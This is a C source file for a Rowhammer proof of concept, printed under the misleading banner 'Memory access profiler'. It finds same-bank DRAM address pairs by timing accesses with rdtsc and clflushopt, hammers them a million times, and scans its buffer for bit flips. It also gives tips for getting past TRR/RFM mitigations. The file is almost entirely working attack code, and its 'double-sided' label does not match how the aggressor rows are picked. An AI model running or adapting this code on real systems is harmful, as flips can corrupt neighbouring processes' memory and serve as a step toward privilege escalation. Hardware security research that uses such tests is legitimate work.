#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define BUFFER_SIZE      (256 * 1024 * 1024)
#define HAMMER_COUNT     1000000ULL
#define BANK_THRESHOLD   300
#define CACHE_LINE       64
#define ROW_STRIDE       4096

static inline void cache_flush(volatile void *addr)
{
    _mm_clflushopt((void *)addr);
    _mm_mfence();
}

static inline uint64_t read_cycle_counter(void)
{
    _mm_lfence();
    uint64_t t = __rdtsc();
    _mm_lfence();
    return t;
}

static uint64_t time_pair(volatile char *a, volatile char *b)
{
    cache_flush(a);
    cache_flush(b);

    uint64_t t1 = read_cycle_counter();
    *a;
    *b;
    uint64_t t2 = read_cycle_counter();

    return t2 - t1;
}

static void hammer_pair(volatile char *aggressor_a,
                        volatile char *aggressor_b,
                        uint64_t      iterations)
{
    for (uint64_t i = 0; i < iterations; i++) {
        *aggressor_a;
        *aggressor_b;
        _mm_clflushopt((void *)aggressor_a);
        _mm_clflushopt((void *)aggressor_b);
    }
    _mm_mfence();
}

static int scan_for_flips(uint8_t *buf, size_t size, uint8_t expected)
{
    int count = 0;
    for (size_t i = 0; i < size; i++) {
        if (buf[i] != expected) {
            printf("  [FLIP] offset=0x%06zx expected=0x%02x got=0x%02x\n",
                   i, expected, buf[i]);
            count++;
        }
    }
    return count;
}

int main(void)
{
    printf("=== Memory access profiler ===\n\n");

    uint8_t *buf = mmap(
        NULL, BUFFER_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
        -1, 0
    );
    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memset(buf, 0xFF, BUFFER_SIZE);
    printf("[*] Allocated %d MB at %p\n", BUFFER_SIZE >> 20, (void *)buf);
    printf("[*] Scanning for same-bank pair (this may take a moment)...\n");

    volatile char *aggressor_a = NULL;
    volatile char *aggressor_b = NULL;

    for (size_t i = 0; i < BUFFER_SIZE && !aggressor_a; i += ROW_STRIDE) {
        for (size_t j = i + ROW_STRIDE * 2; j < BUFFER_SIZE; j += ROW_STRIDE) {
            volatile char *a = (volatile char *)(buf + i);
            volatile char *b = (volatile char *)(buf + j);

            uint64_t max_cycles = 0;
            for (int s = 0; s < 10; s++) {
                uint64_t c = time_pair(a, b);
                if (c > max_cycles) max_cycles = c;
            }

            if (max_cycles > BANK_THRESHOLD) {
                aggressor_a = a;
                aggressor_b = b;
                printf("[*] Same-bank pair found:\n");
                printf("    aggressor A: offset 0x%06zx\n", i);
                printf("    aggressor B: offset 0x%06zx\n", j);
                printf("    latency:     %lu cycles (threshold: %d)\n\n",
                       max_cycles, BANK_THRESHOLD);
                break;
            }
        }
    }

    if (!aggressor_a) {
        printf("[-] No same-bank pair found.\n");
        printf("    Possible reasons:\n");
        printf("    - Modern DDR4/DDR5 with TRR/RFM mitigation\n");
        printf("    - Threshold needs tuning for this hardware\n");
        printf("    - Try increasing BUFFER_SIZE or adjusting ROW_STRIDE\n");
        munmap(buf, BUFFER_SIZE);
        return 1;
    }

    printf("[*] Hammering %llu activations (double-sided)...\n",
           (unsigned long long)HAMMER_COUNT);
    hammer_pair(aggressor_a, aggressor_b, HAMMER_COUNT);
    printf("[*] Hammering complete.\n\n");

    printf("[*] Scanning for bit flips...\n");
    int flips = scan_for_flips(buf, BUFFER_SIZE, 0xFF);

    if (flips > 0) {
        printf("\n[+] SUCCESS: %d bit flip(s) detected.\n", flips);
        printf("    This demonstrates rowhammer works on this hardware.\n");
    } else {
        printf("[-] No bit flips detected.\n");
        printf("    Hardware mitigations (TRR/RFM) may be active.\n");
        printf("    Try: increasing HAMMER_COUNT, different BANK_THRESHOLD,\n");
        printf("         or running on older DDR3/DDR4 without mitigations.\n");
    }

    munmap(buf, BUFFER_SIZE);
    return 0;
}
